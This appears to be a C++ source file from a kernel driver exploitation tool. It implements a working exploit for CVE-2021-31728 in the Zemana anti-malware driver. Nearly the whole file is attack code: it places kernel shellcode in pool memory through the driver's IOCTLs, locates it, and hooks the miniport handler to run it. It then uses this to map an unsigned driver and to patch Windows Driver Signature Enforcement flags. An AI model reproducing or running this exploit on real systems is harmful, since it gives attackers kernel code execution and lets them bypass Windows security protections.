/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ZEMANA.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Zemana driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/zemana.h"

#define ZEMANA_POOL_TAG 'ANMZ'

BYTE g_DebugBuffer[2048];

#ifdef __cplusplus
extern "C" {
    void ZmShellStager();
    void ZmShellStagerEnd();
    void ZmShellDSEFix();
    void ZmShellDSEFixEnd();
}
#endif

#pragma pack( push, 1 )
typedef struct _ZM_SCSI_ACCESS {
    ULONG32 DiskNumber;
    UCHAR   Pad0;

    UCHAR   PathId;
    UCHAR   TargetId;
    UCHAR   Lun;

    ULONG32 OffsetHigh;
    ULONG32 OffsetLow;

    ULONG32 Length;

    ULONG32 Count;
    //irrelevant
} ZM_SCSI_ACCESS, * PZM_SCSI_ACCESS;

typedef struct _ZM_SCSI_MINIPORT_FIX {
    CHAR    DriverName[MAX_PATH];
    ULONG32 Offset_Func1;
    UCHAR    FixCode_Func1[128];
    ULONG32 Offset_Func2;
    UCHAR    FixCode_Func2[128];
} ZM_SCSI_MINIPORT_FIX, * PZM_SCSI_MINIPORT_FIX;
#pragma pack( pop )

typedef struct _UNZERO_PTR {
    ULONG_PTR   addr;
    ULONG_PTR   mask;
} UNZERO_PTR, * PUNZERO_PTR;

/*
* UnzeroXorMask
*
* Purpose:
*
* Shellcode can't contain 2 consecutive zeroes because Zemana expects it to be a string.
* Make supplied address string buffer compatible.
*
*/
UNZERO_PTR UnzeroXorMask(ULONG_PTR x)
{
    int             c;
    unsigned char   e;
    ULONG_PTR       u, w;
    UNZERO_PTR      r = { 0, 0 };

    for (c = 0; c < sizeof(r.addr); ++c)
    {
        e = x & 0xff;

        if (e == 0x69)
        {
            w = (e ^ 0xaa);
            u = (0xaa);
        }
        else
        {
            w = (e ^ 0x69);
            u = (0x69);
        }

        r.addr += w << (8 * c);
        r.mask += u << (8 * c);
        x >>= 8;
    }

    return r;
}

/*
* ZmExploit_CVE2021_31728
*
* Purpose:
*
* Exploit Zemana crapware features using CVE2021-31728.
* Note several earlier exploits for wide variety of this fake AV factory "SDK" used as well.
*
*/
BOOL ZmExploit_CVE2021_31728(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID StagerShellCode,
    _In_ SIZE_T StagerShellSize
)
{
    BOOL bResult = FALSE;
    PSYSTEM_BIGPOOL_INFORMATION pi = NULL;
    ULONG_PTR* poolList = NULL;
    ULONG i, poolCount = 0, currentPool = 0;

    ZM_SCSI_ACCESS scsiRequest;
    CHAR sectorBuffer[512];
    CHAR buffer[4096 - 16 + 4];

    do {

        if (StagerShellSize > 2048) {
            supPrintfEvent(kduEventError,
                "[!] Stager size exceeds limit, abort\r\n");
            break;
        }

        //
        // At first we locate initial Zemana pools and remember them.
        //
        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
        if (pi == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Failed to query pool information, abort\r\n");
            break;
        }

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG)
                poolCount++;
        }

        if (poolCount == 0) {
            supPrintfEvent(kduEventError,
                "[!] Abort: No Zemana pools found\r\n");
            break;
        }

        printf_s("[+] Number of Zemana pools found: %lu\r\n", poolCount);

        poolList = (ULONG_PTR*)supHeapAlloc(poolCount * sizeof(ULONG_PTR));
        if (poolList == NULL)
            break;

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG)
                poolList[currentPool++] = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress;
        }

        supHeapFree(pi);
        pi = NULL;

        //
        // Second, insert FsRtlIsNameInExpression bypass entry.
        //
        WCHAR FsRtlIsNameInExpressionEntry[6];

        FsRtlIsNameInExpressionEntry[2] = '*';
        FsRtlIsNameInExpressionEntry[3] = '.';
        FsRtlIsNameInExpressionEntry[4] = 'A';
        FsRtlIsNameInExpressionEntry[5] = 0;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_PROTECT_REGISTRY,
            &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry),
            &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry));

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Failed to insert FsRtlIsNameInExpression bypass entry, abort\r\n");
            break;
        }

        //
        // Next, move shellcode into string buffer.
        //
        RtlFillMemory(buffer, 4096 - 16 + 4, 0xCC);
        RtlCopyMemory(&buffer[4], StagerShellCode, StagerShellSize);

        //
        // Fill string buffer tail.
        //
        buffer[4096 - 16 + 4 - 6] = '.';
        buffer[4096 - 16 + 4 - 5] = 0;
        buffer[4096 - 16 + 4 - 4] = 'A';
        buffer[4096 - 16 + 4 - 3] = 0;

        buffer[4096 - 16 + 4 - 2] = 0;
        buffer[4096 - 16 + 4 - 1] = 0;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_PROTECT_REGISTRY,
            buffer, 4096 - 16 + 4,
            buffer, 4096 - 16 + 4);

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Failed to insert shellcode into string buffer, abort\r\n");
            break;
        }

        //
        // Find new Zemana driver pool, if there is anything new - we failed.
        //
        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
        if (pi == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Failed to query pool information, abort\r\n");
            break;
        }

        BOOL bFound = TRUE;
        ULONG_PTR kernelShellCode = 0;

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG) {

                bFound = TRUE;

                for (currentPool = 0; currentPool < poolCount; currentPool++) {

                    bFound = (poolList[currentPool] == (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress);
                    if (bFound)
                        break;

                }

                if (!bFound) {
                    kernelShellCode = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress & ~1;
                    kernelShellCode += 0x10;
                    break;
                }
            }
        }

        supHeapFree(pi);
        pi = NULL;

        supHeapFree(poolList);
        poolList = NULL;

        if (bFound) {
            supPrintfEvent(kduEventError,
                "[!] Could not find allocated stager shellcode, abort\r\n");
            break;
        }

        printf_s("[+] Stager shellCode allocated at 0x%llX\r\n", kernelShellCode);

        CHAR szDriverName[MAX_PATH];

        RtlSecureZeroMemory(&szDriverName, sizeof(szDriverName));
        

        //
        // Trigger shellcode.
        //
        ZM_SCSI_MINIPORT_FIX MiniportFix;
        ANSI_STRING drvFileName;

        RtlSecureZeroMemory(&MiniportFix, sizeof(MiniportFix));

        drvFileName.Buffer = NULL;
        drvFileName.Length = drvFileName.MaximumLength = 0;

        ntsupConvertToAnsi(Context->Provider->LoadData->DriverName, &drvFileName);

        StringCchPrintfA(MiniportFix.DriverName, MAX_PATH, "%s.sys", drvFileName.Buffer);

        MiniportFix.Offset_Func1 = 0xD553; //driver specific offset, correct it for another sample

        BYTE patchCode[] =
        {   0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
            0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
            0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
            0xEB, 0x00                                                  // jmp rel8 
        };

        RtlCopyMemory(MiniportFix.FixCode_Func1, patchCode, sizeof(patchCode));

        //
        // Point the call to it.
        //
        *(ULONG64*)(MiniportFix.FixCode_Func1 + 2) = kernelShellCode;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_SAVE_MINIPORT_FIX,
            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX),
            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX));

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Could not install miniport hook, abort\r\n");
            break;
        }

        printf_s("[+] Zemana miniport hook installed, performing stager shellcode execution\r\n");

        RtlSecureZeroMemory(&scsiRequest, sizeof(scsiRequest));

        scsiRequest.Count = 512;
        scsiRequest.Length = 1;
        RtlFillMemory(sectorBuffer, sizeof(sectorBuffer), 0xff);

        supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_SCSI_WRITE,
            &scsiRequest, sizeof(ZM_SCSI_ACCESS),
            &sectorBuffer, sizeof(sectorBuffer));

        printf_s("[+] Stager shellcode executed\r\n");

        bResult = TRUE;

    } while (FALSE);

    if (pi) supHeapFree(pi);
    if (poolList) supHeapFree(poolList);

    return bResult;
}

/*
* ZmMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL ZmMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bResult = FALSE, bLocked = FALSE;

    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;

    ULONG cbPayload = 0;
    PVOID pvPayload = NULL;

    HANDLE sectionHandle = NULL;
    HANDLE victimDeviceHandle = NULL;
    ULONG_PTR dispatchAddress = 0;

    unsigned char shellBuffer[1000];
    SIZE_T shellSize = (ULONG_PTR)ZmShellStagerEnd - (ULONG_PTR)ZmShellStager;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {
        if (VpCreate(victimProv,
            Context->ModuleBase,
            &victimDeviceHandle,
            NULL,
            NULL))
        {
            printf_s("[+] Victim is loaded, handle 0x%p\r\n", victimDeviceHandle);
        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Could not load victim target, GetLastError %lu\r\n", GetLastError());

        }

        VICTIM_DRIVER_INFORMATION vdi;

        RtlSecureZeroMemory(&vdi, sizeof(vdi));

        if (!VpQueryInformation(Context->Victim, VictimDriverInformation, &vdi, sizeof(vdi))) {
            supPrintfEvent(kduEventError,
                "[!] Could not query victim driver information, GetLastError %lu\r\n", GetLastError());
            break;
        }

        dispatchAddress = vdi.LoadedImageBase;

        if (dispatchAddress == 0) {
            supPrintfEvent(kduEventError,
                "[!] Could not query victim target\r\n");
            break;
        }
        
        VICTIM_IMAGE_INFORMATION vi;

        RtlSecureZeroMemory(&vi, sizeof(vi));

        if (!VpQueryInformation(
            Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
        {
            supPrintfEvent(kduEventError,
                "[!] Could not query victim image information, GetLastError %lu\r\n", GetLastError());
            break;
        }

        dispatchAddress += vi.DispatchOffset;

        printf_s("[+] Victim target 0x%llX\r\n", dispatchAddress);

        pvPayload = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
#ifdef _DEBUG
        RtlFillMemory(g_DebugBuffer, sizeof(g_DebugBuffer), 0xCC);
        pvPayload = &g_DebugBuffer;
#else
        if (pvPayload == NULL)
            break;
#endif
        cbPayload = ScSizeOf(KDU_SHELLCODE_V4, NULL);
        bLocked = VirtualLock(pvPayload, cbPayload);
        if (!bLocked)
            break;

        RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
        RtlCopyMemory(shellBuffer, ZmShellStager, shellSize);

        UNZERO_PTR uptr;

        //
        // Target dispatch address.
        //
        uptr = UnzeroXorMask((ULONG_PTR)dispatchAddress);
        *(PULONG_PTR)&shellBuffer[0x5] = uptr.addr;
        *(PULONG_PTR)&shellBuffer[0xf] = uptr.mask;

        //
        // Payload address.
        //
        uptr = UnzeroXorMask((ULONG_PTR)pvPayload);
        *(PULONG_PTR)&shellBuffer[0x1f] = uptr.addr;
        *(PULONG_PTR)&shellBuffer[0x29] = uptr.mask;

        bResult = ZmExploit_CVE2021_31728(Context, &shellBuffer, shellSize);

        if (!bResult) {
            supPrintfEvent(kduEventError, "[!] Could not trigger exploit\r\n");
            break;
        }

        printf_s("[+] Forcing provider unload, please wait\r\n");

        //
        // Force unload provider driver.
        //
        NtClose(Context->DeviceHandle);
        Context->DeviceHandle = NULL;

        Context->Provider->Callbacks.StopVulnerableDriver(Context);

    } while (FALSE);

    if (bLocked) VirtualUnlock(pvPayload, cbPayload);
    if (pvPayload) ntsupVirtualFree(pvPayload);
    if (sectionHandle) {
        NtClose(sectionHandle);
    }
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
    return bResult;
}

/*
* ZmControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state via Zemana driver.
*
*/
BOOL ZmControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    UNZERO_PTR uptr;
    unsigned char shellBuffer[1000];
    SIZE_T shellSize = (ULONG_PTR)ZmShellDSEFixEnd - (ULONG_PTR)ZmShellDSEFix;

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, ZmShellDSEFix, shellSize);

    //
    // Kernel DSE flags address
    //
    uptr = UnzeroXorMask(Address);
    *(PULONG_PTR)&shellBuffer[0x3] = uptr.addr;
    *(PULONG_PTR)&shellBuffer[0xd] = uptr.mask;

    //
    // New value to be written
    //
    uptr = UnzeroXorMask(DSEValue);
    *(PULONG_PTR)&shellBuffer[0x1a] = uptr.addr;
    *(PULONG_PTR)&shellBuffer[0x24] = uptr.mask;

    bResult = ZmExploit_CVE2021_31728(Context, &shellBuffer, shellSize);

    if (bResult)
        supPrintfEvent(kduEventInformation, "[+] DSE patch executed successfully\r\n");

    return bResult;
}

/*
* ZmRegisterDriver
*
* Purpose:
*
* Register Zemana driver client.
*
*/
BOOL WINAPI ZmRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    DWORD currentProcessId = GetCurrentProcessId(), dummy = 0;

    return supCallDriver(DeviceHandle,
        IOCTL_ZEMANA_REGISTER_PROCESS,
        &currentProcessId,
        sizeof(DWORD),
        &dummy,
        sizeof(DWORD));
}
